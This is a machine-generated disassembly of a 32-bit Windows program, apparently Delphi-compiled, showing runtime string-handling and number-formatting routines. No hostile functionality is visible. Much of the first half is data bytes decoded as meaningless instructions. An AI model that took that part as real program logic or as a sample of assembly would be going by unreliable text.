and [ ecx + 0x40 ] bh
inc ebp
jb r-xdata
inc ebp
dec ebp
popad
je r-xdata
xor eax [ eax ]
xor [ ebx ] 0x40
add [ edx ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0xc0040 ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ eax ] bl
mov esi 0x33800040
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jns r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x79786564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jpe r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al bh
je r-xdata
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xb004033 ] al
inc ebp
pop edx
jb r-xdata
rcl al 0x79
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
jpe r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + edi * 2 ] ah
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xa004033 ] al
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax * 2 + 0x4f746e49 ] cl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
enter 0x4078 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4078 0x0
adc [ eax ] al
add [ eax ] al
and al 0x78
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add al ah
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] bh
lea eax [ eax ]
loopne r-xdata
inc ebp
push ebp
outsb
jb r-xdata
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ edx ] cl
jpe r-xdata
add [ eax ] al
nop
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edx + 0x40 ] bh
add [ eax + eax ] cl
insb
outsd
ja r-xdata
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ebx ] cl
inc eax
add [ eax + 0x78 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x10004033 ] al
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ eax ] al
jb r-xdata
add [ ebx + esi + 0x40 ] al
add [ eax + 0xd004033 ] al
inc ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
jbe r-xdata
cmp al 0x7b
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xc004033 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x9004033 ] al
inc ebp
dec edi
jbe r-xdata
sub [ ebx ] dh
sub [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
outsb
lea eax [ eax ]
pushfd
jpo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
jbe r-xdata
inc eax
sar [ ebx + edi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
jl r-xdata
insb
nop
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
jbe r-xdata
add [ ebx + esi + 0x40 ] al
add [ eax + 0xa004033 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x100040 ] bl
add [ eax ] al
or [ esi + 0x40 ] dh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
jpo r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebp + edi * 2 + 0x40 ] ah
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00407c ] ch
add [ eax ] al
add [ eax - 0x27ffbf8c ] dl
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7c ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jpo r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jge r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi * 2 + 0xc0040 ] al
add [ eax ] al
nop
je r-xdata
outsd
insb
inc ebx
mov eax eax
test al 0x7c
inc eax
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
nop
je r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jge r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x40 ] ah
inc ebp
inc ecx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x10004033 ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
hlt
outsd
jb r-xdata
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
xor [ ebx ] 0x40
add [ esi ] cl
sbb al 0x7e
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 ] bl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x27ffbf8c ] dl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x8004033 ] al
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ ebp + 0x40 ] 0x0
or al 0x0
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
inc ebp
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ecx ] cl
rol [ edi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x7c
inc eax
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
insb
outsd
ja r-xdata
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ esi ] cl
inc eax
add [ esi + edi * 2 + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
jae r-xdata
adc [ ebp + 0x41 ] al
sar [ ebp + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xd004033 ] al
inc ebp
push esi
popad
jb r-xdata
add al bl
inc ebp
push eax
jb r-xdata
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ edx ] cl
push eax
jl r-xdata
add [ eax ] al
add al bl
xor eax 0x35e40040
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebp
jb r-xdata
add [ ebx + esi + 0x40 ] al
add [ eax + 0x9004033 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ebx + esi + 0x40 ] al
add [ eax + 0x130040d3 ] dh
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x40 ] dh
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
sub [ edi + 0x40 ] bh
imul ebp [ edi + 0x6e ] 0x407e8c90
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add ah dh
adc [ eax ] al
dec eax
add [ eax ] al
add ah dh
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407f7c3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x80
inc eax
add [ eax + 0x407f ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 4 ] al
inc eax
add [ eax ] dh
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add al bl
xor eax 0x5bd00040
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ ebp + edx * 8 + 0x40 ] dl
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
jb r-xdata
add [ eax ] ch
jg r-xdata
je r-xdata
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x12004033 ] al
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
sar bh 0xff
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
retn
je r-xdata
inc eax
add al ch
xor eax 0x35e40040
add eax 0xffffffd4
jmp sub_40d6cc
aam 0xe9
xchg [ edi ] edx
add [ ebx - 0x14162b40 ] al
push edi
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d5e0
add [ eax + eax ] al
add [ eax ] dh
adc [ eax ] eax
fdiv [ 0x35e40040 ]
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
insb
jae r-xdata
call sub_40bd3c
call sub_403b5c
pop edi
pop esi
pop ebx
retn
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax + 0x1100407e ] 0x3
cmp [ cs : esp + eax ] dh
add [ eax ] al
add ah dh
adc [ eax ] al
dec eax
add [ eax ] al
add ah dh
adc [ eax ] al
or [ ebx + 0x79 ] dl
insb
jne r-xdata
mov eax ebx
call sub_4027b4
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov edx ebx
call sub_402da4
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
sub_40802c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_408060
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
pop edi
pop esi
pop ebx
retn
sub_408084
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4027b4
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402da4
mov eax esi
pop esi
pop ebx
retn
sub_4080a4
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4027d4
call ebx
pop ebx
retn
sub_4080d0
push ebx
mov ebx eax
mov eax 0xc
call sub_4027b4
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_4080a4
pop ebx
retn
sub_408108
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043e0
mov ebx eax
mov eax edi
mov edx ebx
call sub_40476c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_408144
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043e0
mov ebx eax
mov eax edi
mov edx ebx
call sub_40476c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_408180
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_4081b0
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_4081d0
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_408224
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_4081d0
test eax eax
jne r-xdata
sub_408248
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043e0
mov ebx eax
mov eax esi
call sub_4045e0
mov edx eax
mov eax edi
mov ecx ebx
call sub_404210
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_40827c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4043e0
mov ebx eax
mov eax esi
call sub_4045e0
mov edx eax
mov eax edi
mov ecx ebx
call sub_404210
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_4082b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043e0
push eax
mov eax esi
call sub_4045e0
push eax
mov eax ebx
call sub_4043e0
push eax
mov eax ebx
call sub_4045e0
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4082e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043e0
push eax
mov eax esi
call sub_4045e0
push eax
mov eax ebx
call sub_4043e0
push eax
mov eax ebx
call sub_4045e0
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408338
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408358
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4043e0
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404120
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404640
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4083a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_408501
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
mov eax edi
call sub_4043e0
mov esi eax
add esi ebx
mov eax edi
call sub_4043e0
mov [ ebp - 0xc ] eax
cmp esi ebx
jbe r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_404318
mov eax [ ebp - 0x14 ]
call sub_4043e0
cmp eax [ ebp - 0xc ]
jne r-xdata
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
mov ebx edi
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_404210
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
cmp esi ebx
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx edi
call sub_404174
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408508
lea eax [ ebp - 0x14 ]
call sub_404120
retn
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
inc ebx
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
jmp r-xdata
mov [ edi ] 0xd
inc edi
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
dec [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc ebx
jmp r-xdata
mov eax ebx
call sub_40c870
mov ebx eax
jmp r-xdata
cmp esi ebx
ja r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
cmp [ ebx ] 0xa
jne r-xdata
mov [ edi ] 0xd
inc edi
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
cmp esi ebx
ja r-xdata
inc ebx
jmp r-xdata
mov al [ ebx ]
mov [ edi ] al
inc edi
inc ebx
mov eax ebx
call sub_40c850
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax ebx
mov ecx [ ebp - 0x10 ]
call sub_4029b0
add edi [ ebp - 0x10 ]
add ebx [ ebp - 0x10 ]
jmp r-xdata
sub_408510
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4043e0
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4043e0
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408574
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_40858a
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_40858a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40858a
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4085c0
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408574
mov edx esi
pop eax
call sub_404210
add esp 0x10
pop esi
retn
sub_4085e0
or cl cl
jne sub_408614
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408614
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408614
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408614
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4086ac
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4085e0
mov edx esi
pop eax
call sub_404210
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_4086d4
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408574
mov edx esi
pop eax
call sub_404210
add esp 0x20
pop esi
retn
xor edx edx
sub_4086fc
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402dc4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
